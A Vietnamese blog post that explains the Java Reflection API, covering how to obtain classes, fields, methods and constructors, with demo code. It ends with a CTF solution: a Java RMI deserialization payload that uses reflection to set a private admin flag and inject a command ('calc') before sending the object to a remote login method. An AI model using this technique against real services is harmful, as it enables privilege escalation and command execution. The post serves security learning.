---
layout: post
title: "Khái niệm về java reflection"
categories: Pentest
tags: [redteam, OS, PE, blueteam]
---

# Java Reflection là gì??

Như ở đây, ta tạm hiểu java reflection là 1 API Java. Nó cho phép truy cập và sửa đổi hành vi đối tượng (tên class, các field, các method, interface,...) trong quá trình Runtime. Đồng thời nó còn cho phép truy cập các private fields của đối tượng - điều này không được phép so với cách tiếp cận truyền thống

Java Reflection có thể tác động đến method nếu chúng ta biết tên và tham số được truyền vào.

# Kiến trúc của 1 Reflect API

Các class được dùng trong Reflection nằm trong *_java.lang.reflect_* package.

- Object
    + Object class là class gốc trong hệ thống phân lớp class
    + Mọi class đều là con của Object class hay nói cách khác, Object class là class cha của toàn bộ các class
- Class
    + Là một package được cung cấp bởi java.lang.Class
    + Một instance class đại diện cho toàn bộ các kiểu dữ liệu trong java bao gồm các kiểu dữ liệu cơ bản như: (boolean, byte, char, short, int, long), void, array, class, interface, enumeration, annotation.
    + Class không có public constructor. Thay vào đó, object của Class được tạo ra tự động bởi JVM trong quá trình RunTime
    + Khi sử dụng class phải có 1 đối tượng kiểu class, từ các đối tượng kiểu Class có thể lấy được thông tin về
        * Class Name
        * Class Modifies (public, private, synchronized etc.)
        * Package Info
        * Superclass
        * Implemented Interfaces
        * Constructors
        * Methods
        * Fields
        * Annotations

# Cách sử dụng Refection API

## Có 3 cách để lấy ra object Class
- Cách 1: forName()
- Cách 2: <class name>.class
- Cách 3: getClass()

```
import java.io.*;
import java.lang.*;

class Demo{
    private String name = "Konchan";
    public int age = 21;

    public Demo(){};

    private void hack(){
        System.out.println("How to hack ");
    }
    public void say(){
        System.out.println("How to say ");
    }
}
public class SerializeDemo {
    public static void main(String[] args) throws Exception{
        Demo demo = new Demo();
        Class c1 = demo.getClass();
        Class c2 = Demo.class;
        Class c3 = Class.forName("Demo");

        System.out.println("C1: "+c1);
        System.out.println("C2: "+c2);
        System.out.println("C3: "+c3);
    }
}
```

## Có 4 cách để lấy fields

- Cách 1: Field[] getFields()
-> Trả về tất cả fields có modifier là public

- Cách 2: Field getField(String name)
-> trả về field public, tham số truyền vào là tên cụ thể của field đó

- Cách 3: Field[] getDeclaredFields()
-> trả về tất cả fields, không quan tâm đến modifier của field đó

- Cách 4: Field getDeclaredField(String name)
-> trả về field mà không quan tâm field đó có modifier nào, tham số truyền vào là tên cụ thể của field đó




- Cách truy cập vào field bất kể access Modofier

    +<field lấy được>.setAccessible(boolen flag)

- Cách lấy giá trị của field

    + <field lấy được>.get(Object obj)

- Cách sửa giá trị 1 field

    + <Field lấy được>.set(Object obj, Object value)

## Có 4 cách lấy ra method
- Cách 1: Method[] getMethods()
-> trả về tất cả method có modifier là public

- Cách 2: Method getMethod()
-> trả về method có modifier là public  

- Cách 3: Method[] getDeclaredMethods()
-> trả về method mà không quan trọng modifier

- Cách 4: Method getDeclaredMethod(String name, class<?>... parameterTypes)
trả về method mà không quan tâm method đó có modifier là gì(ngoại trừ protected), tham số truyền vào là tên cụ thể của method đó

>Cách thực thi 1 method
Method.invoke(Object, parameter)
>Note: Nếu 1 method của class không chấp nhận bất kì tham số nào, có thể dùng null để pass

## Có 4 cách để lấy ra 1 constructor
- Cách 1: Constructor<?>[] getConstructors()
- Cách 2: Constructor getConstructor(class<?>... parameterTypes)
- Cách 3: Constructor getDeclaredConstructor(class<?>... parameterTypes)
- Cách 4: Constructor<?>[] getDeclaredConstructors()

## Setup minh họa


Cấu trúc thư mục sẽ là như này


![GIRL](/images/java reflection/pic1.jfif)


file Person.java

```
package org.example;

public class Person {
    private String name = "Spycio.Kon" ;
    private int age = 21;
    public String a = "how2hack";


    public Person() {
    }

    public void eat(){
        System.out.println("eat");
    }
    public void eat(String food){
        System.out.println("eat "+food);
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", a='" + a + '\'' +
                '}';
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }
}

```

file Main.java
```
package org.example;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Constructor;


public class Main {

    public static void main(String[] args) throws Exception {
        // Sử dụng Class.forName() để lấy ra object Class
        Class cls = Class.forName("org.example.Person");
        // Sử dụng getField() để lấy field cụ thể (có modifier public)
        Field a = cls.getField("a");
        System.out.println("(+) Demo getField(): ");
        System.out.println(a + "\n"); // "a" ko public nên sẽ trả về null

        Person person = new Person();
        Object o = a.get(person);
        System.out.println("(+) Demo <Field lấy được>.get():");
        System.out.println(o + "\n");

        a.set(person, "abc");
        System.out.println("(+) Demo <Field lấy được>.set():");
        System.out.println(person + "\n");

        // Sử dụng getDeclaredFields() để lấy toàn bộ Field
        System.out.println("(+) Demo getDeclaredFields():");
        Field[] declaredFields = cls.getDeclaredFields();
        for (Field declaredField : declaredFields) {
            System.out.println(declaredField);
        }
        System.out.println("\n");

        // Sử dụng setAccessible() để truy cập vào field bất kể access modifier,
        // ở đây a là 1 field private
        a.setAccessible(true);
        Object o1 = a.get(person);
        System.out.println("(+) Demo <Field lấy được>.setAccessible(): ");
        System.out.println(o1 + "\n");

        // Sử dụng getMethods() để lấy ra toàn bộ Method
        System.out.println("(+) Demo getMethods(): ");
        Method[] methods = cls.getMethods();
        for (Method method : methods) {
            System.out.println(method);
        }
        System.out.println("\n");

        // Lấy ra tên class
        System.out.println("(+) Demo getName(): ");
        String name = cls.getName();
        System.out.println(name + "\n");

        Constructor constructor = cls.getConstructor(String.class,int.class);
        System.out.println("(+) Demo getConstructor(): ");
        System.out.println(constructor + "\n");

        // Construct có param
        System.out.println("(+) Demo <Constructor lấy được>.getConstructor() khi có param: ");
        Object o2 = constructor.newInstance("xxxxx", 19);
        System.out.println(o);

        // Construct không có param
        System.out.println("(+) Demo <Constructor lấy được>.getConstructor() khi không có param: ");
        Object o3 = constructor.newInstance();
        System.out.println(o3);
    }
}

```
Ap dung giai CTF: Java deserialization

```
// Payload.java
package rmi;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Payload {
    public static void main(String[] args) throws RemoteException, BadAttributeValueExpException, NotBoundException, NoSuchFieldException, IllegalAccessException {
        String serverIP = "127.0.0.1";
        int serverPort = 1099;
        String name = "hacker";

        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);

        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
        ASCISInterf ascisInterf = (ASCISInterf)registry.lookup("ascis");

        rmi.Player player = new rmi.Player(); // khoi tao doi tuong player;

        Field isAdmin = player.getClass().getDeclaredField("isAdmin");
        isAdmin.setAccessible(true);
        isAdmin.set(player,true);

        Field command = player.getClass().getDeclaredField("logCommand");
        command.setAccessible(true);
        command.set(player,"calc");

        Field val = payload.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(payload,player);

        System.out.println(ascisInterf.login(payload));
    }
}
```

![GIRL](/images/java reflection/pic2.jfif)

# Tham khảo:

[sheon](https://sheon.hashnode.dev/java-dev-6-reflection-api#heading-cach-lay-ra-constructor)

[onsra03](https://hackmd.io/@onsra03/r1PvmWpnh)

[geeksforgeeks](https://www.geeksforgeeks.org/java/reflection-in-java/)

[stublogs](https://tsublogs.wordpress.com)